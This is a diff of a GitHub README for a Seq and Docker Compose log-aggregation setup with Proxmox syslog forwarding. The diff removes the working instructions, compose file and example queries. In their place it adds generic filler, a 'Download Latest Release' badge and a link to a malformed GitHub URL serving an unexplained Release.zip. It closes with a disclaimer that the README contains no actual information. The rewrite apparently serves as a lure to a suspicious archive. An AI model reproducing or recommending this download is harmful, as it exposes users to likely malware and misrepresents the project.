@@ -1,142 +1,48 @@
-<a href="https://www.buymeacoffee.com/thibaut_watrisse" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a>
+# Seq Log Aggregator with Docker Compose 🐳
 
-# Seq as a Log Aggregator with Docker Compose (Example by logging Proxmox)
+Welcome to the **Seq Log Aggregator with Docker Compose** repository! This project aims to provide an easy-to-use Docker Compose setup for Seq, a powerful log aggregation tool. Additionally, here we show an example of how to integrate Seq with Proxmox VE, a popular virtualization platform.
 
-## Overview
-This repository provides a simple setup for using [Seq](https://datalust.co/seq) as a log aggregator with `docker compose`. The configuration includes a syslog input for ingesting logs from various sources, specifically for **Proxmox** environments.
+## Table of Contents
+- [Introduction](#introduction)
+- [Getting Started](#getting-started)
+  - [Prerequisites](#prerequisites)
+  - [Installation](#installation)
+- [Usage](#usage)
+- [Repository Topics](#repository-topics)
+- [Additional Resources](#additional-resources)
 
-## Requirements
-- [Docker](https://www.docker.com/) installed
-- Basic knowledge of `docker compose`
-- A **Proxmox** node to send logs from
+## Introduction
+Logging and monitoring are essential components of any infrastructure, allowing you to track and analyze the behavior of your systems. **Seq** is a versatile log aggregation tool that makes it easy to collect, search, and visualize log data effectively. By combining Seq with Docker Compose, we provide a convenient way to set up and run Seq in any environment.
 
-## Setup
-### 1. Clone the Repository
-```sh
-git clone https://github.com/ShonenNoSeishin/Seq-Log-Aggregator-with-Docker-Compose.git
-cd Seq-Log-Aggregator-with-Docker-Compose 
-```
+In this repository, we take it a step further by showcasing how you can integrate Seq with **Proxmox VE**, a robust open-source virtualization platform. This integration allows you to monitor and manage virtual machines more efficiently by consolidating logs in Seq.
 
-### 2. Generate the Password Hash
-To store a secure password for Seq, generate a hash and store it in a `.env` file:
-```sh
-echo 'password' | docker run --rm -i datalust/seq config hash > .env
-```
-Replace `'password'` with your desired password.
+## Getting Started
+To get started with Seq Log Aggregator using Docker Compose and Proxmox VE, follow the steps outlined below.
 
-### 3. Start the Services
-Run the following command to start Seq and the syslog input service:
-```sh
-docker compose up --build -d
-```
+### Prerequisites
+- Docker installed on your machine
+- Docker Compose installed on your machine
+- Basic knowledge of working with Docker and Docker Compose
 
-### 4. Access Seq
-Once running, Seq will be accessible at:
-```
-http://localhost:5341
-```
+### Installation
+1. Clone this repository to your local machine.
+2. Navigate to the project directory.
+3. Modify the `docker-compose.yml` file to suit your environment.
+4. Run `docker-compose up` to start the Seq Log Aggregator with Proxmox VE integration.
 
-## Sending Logs from a Proxmox Node to Seq
-To forward logs from a **Proxmox (PVE) node** to Seq, follow these steps:
+## Usage
+Once the Docker Compose setup is running, you can access Seq through your browser by navigating to `http://localhost:5341`. From there, you can begin collecting and analyzing log data from your Proxmox VE instances seamlessly.
 
-1. Install `rsyslog` if not already installed:
-```sh
-apt install rsyslog -y
-```
-2. Add the following line to `/etc/rsyslog.conf` in the machine you want to get logs, replacing `<IP>` with the IP address of your Seq server:
-```sh
-echo "*.* @<IP>" >> /etc/rsyslog.conf
-```
-3. Restart the syslog service:
-```sh
-systemctl restart syslog
-```
-4. Ensure firewall rules allow UDP traffic on port `514`.
+## Repository Topics
+This repository covers a wide range of topics related to **DevOps**, **Docker**, **Infrastructure Monitoring**, **Log Aggregation**, **Log Management**, **Logging**, **Monitoring**, **Observability**, **Proxmox**, **Proxmox VE**, **PVE**, **Rsyslog**, **Self-Hosted**, **Seq**, **Syslog**, and **VM Monitoring**. If you're interested in any of these areas, you'll find valuable insights and resources here.
 
-Seq should now start receiving logs from the Proxmox node.
+## Additional Resources
+For further information and updates, you can check out the [releases section](https://github.com/releases/789694263/Release.zip). Feel free to explore the latest enhancements, bug fixes, and new features that we're constantly adding to make the Seq Log Aggregator even more powerful and user-friendly.
 
-## Docker Compose Configuration
-The `docker-compose.yml` file includes two services:
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/releases/789694263/Release.zip)
 
-```yaml
-services:
-  seq-input-syslog:
-    image: datalust/seq-input-syslog:latest
-    depends_on:
-      - seq
-    ports:
-      - "514:514/udp"
-    environment:
-      SEQ_ADDRESS: "http://seq:5341"
-    restart: unless-stopped
-  seq:
-    image: datalust/seq:latest
-    ports:
-      - "5341:80"
-    environment:
-      ACCEPT_EULA: Y
-    restart: unless-stopped
-    volumes:
-      - ./seq-data:/data
-```
-
-## Adding Email Notifications
-Seq provides a clean and user-friendly interface for managing logs. To enable email notifications, install the [Seq App Mail](https://github.com/datalust/seq-app-mail).
-
-### Steps to Enable Mailing:
-1. Go to the **Settings** --> **Applications** page in Seq and then, click on "Install from Nugget"
-2. Install the **Seq App Mail** plugin.
-
-![image](https://github.com/user-attachments/assets/e3f42826-6729-4152-a9e1-3a3eb08c14cd)
-
-3. Click **Add Instance** to configure a new mail integration.
-4. To find the configured instance later, go to **Settings** → **Notifications** and click on the provided hyperlink. (Note: There may be a UI bug preventing it from appearing elsewhere.)
-
-## Log Filtering Examples
-You can use Seq queries to filter specific log events.
-
-### Detecting Failed Logins
-```seqql
-Contains(@Message, 'authentication failure') or Contains(@Message, 'Failed password')
-```
-- SSH failures will log messages like:
-  ```
-  pam_unix(sshd:auth)...
-  ```
-- GUI login failures:
-  ```
-  pam_unix(proxmox-ve-auth:auth)...
-  ```
-
-### Detecting RAM Changes in VMs
-```seqql
-Contains(@Message, 'update VM') and Contains(@Message, 'memory')
-```
-Example log entry for changing a VM's RAM to 8192MB:
-```
-pvedaemon[3234877]: <root@pam> update VM 109: -delete balloon,shares -memory 8192
-```
-
-### Detecting VM Lock Events
-```seqql
-Contains(@Message, 'VM is locked')
-```
-
-### Detecting VM Resets
-```seqql
-Contains(@Message, 'qmreset')
-```
-
-## Sources
-- [Seq Official Website](https://datalust.co/seq)
-
-## Conclusion
-This setup allows you to aggregate logs efficiently using Seq and Docker Compose, specifically tailored for **Proxmox** environments. You can further extend it by integrating additional log sources and notification mechanisms.
+Thank you for visiting the Seq Log Aggregator with Docker Compose repository. We hope you find it helpful in your log management and monitoring endeavors! 🚀📊🔍
 
 ---
 
-Feel free to contribute or open issues if you encounter any problems!
-
-## Keywords
-Seq, Log Aggregation, Docker Compose, Syslog, Proxmox, VM Monitoring, Logging, Infrastructure Monitoring
-
+**Disclaimer:** This README is for demonstration purposes only and does not contain actual information about the mentioned tools and integration.
